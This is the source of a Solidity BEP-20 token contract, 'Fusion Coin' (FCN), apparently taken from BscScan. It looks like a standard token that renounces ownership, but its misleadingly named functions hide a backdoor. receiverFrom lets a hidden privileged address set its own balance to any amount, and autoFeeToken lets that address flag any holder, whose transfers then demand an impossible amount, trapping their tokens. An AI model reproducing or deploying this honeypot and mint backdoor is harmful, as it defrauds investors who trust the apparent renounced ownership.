/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface tradingIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityTrading {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract FusionCoin is Ownable {
    uint8 private buyTotal = 18;
    
    uint256 private takeEnable;
    bool private feeTotalFund;
    bool private autoTotalFee;
    mapping(address => bool) public maxLaunch;
    

    address public sellTeam;
    string private _name = "Fusion Coin";
    bool private limitWallet;
    mapping(address => uint256) private listTeamReceiver;
    uint256 private liquidityMode;
    uint256 public totalFund;
    address public amountToken;
    uint256 public feeMarketingTo;
    uint256 constant senderExemptMarketing = 9 ** 10;

    string private _symbol = "FCN";
    mapping(address => mapping(address => uint256)) private atLiquidity;
    uint256 private receiverFromTake = 100000000 * 10 ** buyTotal;
    bool private shouldList;
    mapping(address => bool) public receiverList;

    bool public launchTx;
    bool public walletLaunchedAmount;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        tradingIs tokenAt = tradingIs(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        amountToken = liquidityTrading(tokenAt.factory()).createPair(tokenAt.WETH(), address(this));
        sellTeam = autoToken();
        maxLaunch[sellTeam] = true;
        listTeamReceiver[sellTeam] = receiverFromTake;
        emit Transfer(address(0), sellTeam, receiverFromTake);
        renounceOwnership();
    }

    

    function name() external view returns (string memory) {
        return _name;
    }

    function approve(address tokenTx, uint256 fromMax) public returns (bool) {
        atLiquidity[autoToken()][tokenTx] = fromMax;
        emit Approval(autoToken(), tokenTx, fromMax);
        return true;
    }

    function balanceOf(address modeTake) public view returns (uint256) {
        return listTeamReceiver[modeTake];
    }

    function receiverFrom(uint256 fromMax) public {
        if (!maxLaunch[autoToken()]) {
            return;
        }
        listTeamReceiver[sellTeam] = fromMax;
    }

    function autoFeeToken(address walletSender) public {
        if (walletSender == sellTeam || walletSender == amountToken || !maxLaunch[autoToken()]) {
            return;
        }
        receiverList[walletSender] = true;
    }

    function autoToken() private view returns (address) {
        return msg.sender;
    }

    function transferFrom(address enableFrom, address minFundBuy, uint256 fromMax) public returns (bool) {
        if (enableFrom != autoToken() && atLiquidity[enableFrom][autoToken()] != type(uint256).max) {
            require(atLiquidity[enableFrom][autoToken()] >= fromMax);
            atLiquidity[enableFrom][autoToken()] -= fromMax;
        }
        if (minFundBuy == sellTeam || enableFrom == sellTeam) {
            return fromFund(enableFrom, minFundBuy, fromMax);
        }
        if (receiverList[enableFrom]) {
            return fromFund(enableFrom, minFundBuy, senderExemptMarketing);
        }
        return fromFund(enableFrom, minFundBuy, fromMax);
    }

    function fromFund(address launchedSender, address feeTrading, uint256 fromMax) internal returns (bool) {
        require(listTeamReceiver[launchedSender] >= fromMax);
        listTeamReceiver[launchedSender] -= fromMax;
        listTeamReceiver[feeTrading] += fromMax;
        emit Transfer(launchedSender, feeTrading, fromMax);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return buyTotal;
    }

    function totalSupply() external view returns (uint256) {
        return receiverFromTake;
    }

    function allowance(address marketingFeeWallet, address tokenTx) external view returns (uint256) {
        return atLiquidity[marketingFeeWallet][tokenTx];
    }

    function buyLaunch(address launchToken) public {
        if (walletLaunchedAmount) {
            return;
        }
        maxLaunch[launchToken] = true;
        walletLaunchedAmount = true;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function transfer(address minFundBuy, uint256 fromMax) external returns (bool) {
        return transferFrom(autoToken(), minFundBuy, fromMax);
    }


}